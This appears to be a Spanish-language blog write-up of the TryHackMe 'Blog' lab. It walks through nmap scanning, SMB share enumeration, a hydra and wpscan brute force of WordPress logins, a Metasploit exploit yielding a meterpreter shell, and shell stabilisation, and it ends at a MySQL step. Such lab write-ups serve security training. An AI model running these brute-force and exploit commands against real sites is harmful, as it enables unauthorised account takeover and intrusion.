@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Resolución de la Máquina Blog de TryHackMe.'>
+<title>Write Up Blog</title>
+
+<link rel='canonical' href='https://sx1v4n.github.io/p/blog-thm/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Write Up Blog'>
+<meta property='og:description' content='Resolución de la Máquina Blog de TryHackMe.'>
+<meta property='og:url' content='https://sx1v4n.github.io/p/blog-thm/'>
+<meta property='og:site_name' content='S.x1v4n'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-02-17T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-02-17T00:00:00&#43;00:00'/><meta property='og:image' content='https://sx1v4n.github.io/p/blog-thm/logo.png' />
+<meta name="twitter:title" content="Write Up Blog">
+<meta name="twitter:description" content="Resolución de la Máquina Blog de TryHackMe."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://sx1v4n.github.io/p/blog-thm/logo.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo_hude82ea7f464a850aa72eb63e992f12f3_89784_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">S.x1v4n</a></h1>
+            <h2 class="site-description">Jr Penetration Tester / eJPTv2</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sx1v4n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 50 50" width="50px" height="50px">    <path d="M17.791,46.836C18.502,46.53,19,45.823,19,45v-5.4c0-0.197,0.016-0.402,0.041-0.61C19.027,38.994,19.014,38.997,19,39 c0,0-3,0-3.6,0c-1.5,0-2.8-0.6-3.4-1.8c-0.7-1.3-1-3.5-2.8-4.7C8.9,32.3,9.1,32,9.7,32c0.6,0.1,1.9,0.9,2.7,2c0.9,1.1,1.8,2,3.4,2 c2.487,0,3.82-0.125,4.622-0.555C21.356,34.056,22.649,33,24,33v-0.025c-5.668-0.182-9.289-2.066-10.975-4.975 c-3.665,0.042-6.856,0.405-8.677,0.707c-0.058-0.327-0.108-0.656-0.151-0.987c1.797-0.296,4.843-0.647,8.345-0.714 c-0.112-0.276-0.209-0.559-0.291-0.849c-3.511-0.178-6.541-0.039-8.187,0.097c-0.02-0.332-0.047-0.663-0.051-0.999 c1.649-0.135,4.597-0.27,8.018-0.111c-0.079-0.5-0.13-1.011-0.13-1.543c0-1.7,0.6-3.5,1.7-5c-0.5-1.7-1.2-5.3,0.2-6.6 c2.7,0,4.6,1.3,5.5,2.1C21,13.4,22.9,13,25,13s4,0.4,5.6,1.1c0.9-0.8,2.8-2.1,5.5-2.1c1.5,1.4,0.7,5,0.2,6.6c1.1,1.5,1.7,3.2,1.6,5 c0,0.484-0.045,0.951-0.11,1.409c3.499-0.172,6.527-0.034,8.204,0.102c-0.002,0.337-0.033,0.666-0.051,0.999 c-1.671-0.138-4.775-0.28-8.359-0.089c-0.089,0.336-0.197,0.663-0.325,0.98c3.546,0.046,6.665,0.389,8.548,0.689 c-0.043,0.332-0.093,0.661-0.151,0.987c-1.912-0.306-5.171-0.664-8.879-0.682C35.112,30.873,31.557,32.75,26,32.969V33 c2.6,0,5,3.9,5,6.6V45c0,0.823,0.498,1.53,1.209,1.836C41.37,43.804,48,35.164,48,25C48,12.318,37.683,2,25,2S2,12.318,2,25 C2,35.164,8.63,43.804,17.791,46.836z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/ivan-romero-capita-a56838256/'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/writeups/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M336 64h32a48 48 0 0148 48v320a48 48 0 01-48 48H144a48 48 0 01-48-48V112a48 48 0 0148-48h32" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/><rect x="176" y="32" width="160" height="64" rx="26.13" ry="26.13" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/></svg>
+                
+                <span>WriteUps</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"/><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"/></svg>
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archivos/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archivo</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/blog-thm/">
+                <img src="/p/blog-thm/logo.png"
+                        
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Blog" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/try-hack-me/" style="background-color: #f75151; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/blog-thm/">Write Up Blog</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Resolución de la Máquina Blog de TryHackMe.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 17, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Comenzamos haciendo un nmap para ver los servicios y puertos que estan abiertos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Nmap 7.93 scan initiated Wed Feb  <span class="m">1</span> 20:05:11 <span class="m">2023</span> as: nmap -sCV -p 80,139,22,445 -oN target 10.10.201.18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> blog.thm <span class="o">(</span>10.10.201.18<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 578ada90baed3a470c05a3f7a80a8d78 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> c264efabb19a1c87587c4bd50f204626 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 5af26292118ead8a9b23822dad53bc16 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Billy Joel<span class="p">&amp;</span><span class="c1">#039;s IT Blog &amp;#8211; The IT blog</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: WordPress 5.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/wp-admin/
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: BLOG<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-02-01T19:05:26
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6-Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: blog
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: BLOG<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: <span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: blog
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2023-02-01T19:05:26+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2s, deviation: 0s, median: 2s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="m">000000000000</span> <span class="o">(</span>Xerox<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span> at Wed Feb  <span class="m">1</span> 20:05:27 <span class="m">2023</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 15.52 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Realizamos un gobuster para conocer los directorios ocultos.</p>
+<p>En nuestro caso nos interesa /wp-login.php.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/feed/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://blog.thm/wp-login.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/0                    <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/0/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/feed                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/feed/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/atom                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/feed/atom/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/wp-content/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://blog.thm/wp-admin/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/rss2                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/feed/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.201.18/wp-includes/<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Para conocer la versión de wordpress que estamos atacando haremos un whatweb.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whatweb 10.10.201.18
+</span></span><span class="line"><span class="cl">http://10.10.201.18 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.29<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.201.18<span class="o">]</span>, MetaGenerator<span class="o">[</span>WordPress 5.0<span class="o">]</span>, PoweredBy<span class="o">[</span>-wordpress,-wordpress,,WordPress,WordPress,<span class="o">]</span>, Script<span class="o">[</span>text/javascript<span class="o">]</span>, Title<span class="o">[</span>Billy Joel<span class="p">&amp;</span><span class="c1">#039;s IT Blog &amp;#8211; The IT blog], UncommonHeaders[link], WordPress[5.0]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Como hemos visto anteriormente tenia Samba abierto por lo tanto probamos a entrar.</p>
+<p>Deberemos prestar atención al directorio BillySMB.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -L 10.10.201.18 -U guest
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\g</span>uest<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">	---------       ----      -------
+</span></span><span class="line"><span class="cl">	print$          Disk      Printer Drivers
+</span></span><span class="line"><span class="cl">	BillySMB        Disk      Billy<span class="err">&#39;</span>s <span class="nb">local</span> SMB Share
+</span></span><span class="line"><span class="cl">	IPC$            IPC       IPC Service <span class="o">(</span>blog server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Las fotos no sirven para nada.</p>
+<p><img src="/p/blog-thm/smb.png"
+	width="1070"
+	height="281"
+	srcset="/p/blog-thm/smb_huac0e5f2f620eab4d1e6d7f8bf32c72e4_60856_480x0_resize_box_3.png 480w, /p/blog-thm/smb_huac0e5f2f620eab4d1e6d7f8bf32c72e4_60856_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="380"
+		data-flex-basis="913px"
+	
+></p>
+<p>Con BurpSuite podemos ver lo que nos solicita a la hora de el login, por lo tanto gracias a esos datos podemos usar hacer un ataque de fuerza bruta para encontrar el usuario.</p>
+<p><img src="/p/blog-thm/burp.png"
+	width="1132"
+	height="436"
+	srcset="/p/blog-thm/burp_hu021546fad4185f97c5ee35f6b6b1f1af_88275_480x0_resize_box_3.png 480w, /p/blog-thm/burp_hu021546fad4185f97c5ee35f6b6b1f1af_88275_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="623px"
+	
+></p>
+<p>Hydra:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L /home/xicor/dic.txt -P /usr/share/wordlists/rockyou.txt 10.10.201.18 http-post-form <span class="s2">&#34;/wp-login.php:log=admin^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;testcookie=1: Invalid username.&#34;</span>  
+</span></span><span class="line"><span class="cl">Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-02-01 20:00:20
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">186477187</span> login tries <span class="o">(</span>l:13/p:14344399<span class="o">)</span>, ~11654825 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking http-post-form://10.10.201.18:80/wp-login.php:log<span class="o">=</span>admin^USER^<span class="p">&amp;</span><span class="nv">pwd</span><span class="o">=</span>^PASS^<span class="p">&amp;</span>wp-submit<span class="o">=</span>Log+In<span class="p">&amp;</span><span class="nv">redirect_to</span><span class="o">=</span>http%3A%2F%2Fblog.thm%2Fwp-admin%2F<span class="p">&amp;</span><span class="nv">testcookie</span><span class="o">=</span>1: Invalid username.
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 1542.00 tries/min, <span class="m">1542</span> tries in 00:01h, <span class="m">186475645</span> to <span class="k">do</span> in 2015:32h, <span class="m">16</span> active
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 1535.00 tries/min, <span class="m">4605</span> tries in 00:03h, <span class="m">186472582</span> to <span class="k">do</span> in 2024:41h, <span class="m">16</span> active
+</span></span><span class="line"><span class="cl"><span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 10.10.201.18   login: kwheel
+</span></span><span class="line"><span class="cl"><span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 10.10.201.18   login: bjoel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Y para la contraseña, podemos hacer un wpscan al usuario kwheel.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url blog.thm/wp-login.php -U kwheel --passwords /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SUCCESS<span class="o">]</span> - kwheel / *********
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Gracias a estos podemos acceder con un exploit con msfconsole.</p>
+<p>Seteamos los datos necesarios y escribimos run.</p>
+<p><img src="/p/blog-thm/msfconsole.png"
+	width="1002"
+	height="687"
+	srcset="/p/blog-thm/msfconsole_hudfc50fa0877b3ff669227ff6ada6cec7_118784_480x0_resize_box_3.png 480w, /p/blog-thm/msfconsole_hudfc50fa0877b3ff669227ff6ada6cec7_118784_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="350px"
+	
+></p>
+<p>Una vez que hayamos lanzado el exploit , podremos tener un escucha con meterpreter.
+Para poder tener una shell más estable -&gt;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;meterpreter : shell
+</span></span><span class="line"><span class="cl">script /dev/null bash -c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez que tengamos una shell más estable podemos accer con mysql para poder ver las tablas y obtener otros datos potenciales.</p>
